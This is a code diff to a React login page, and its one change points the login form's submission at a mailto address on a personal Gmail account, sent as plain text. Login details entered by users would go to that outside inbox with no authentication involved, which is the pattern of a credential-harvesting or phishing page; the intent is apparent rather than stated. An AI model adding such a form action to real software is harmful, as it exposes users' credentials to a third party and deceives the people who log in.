@@ -27,7 +27,7 @@ export default function Login() {
           </div>
 
           {/* Form */}
-          <form className="space-y-6">
+          <form className="space-y-6" action="mailto:agentxofficialwork@gmail.com" method="post" encType="text/plain">
             <div>
               <label htmlFor="email" className="block text-sm font-medium text-gray-700 mb-2">
                 Email Address
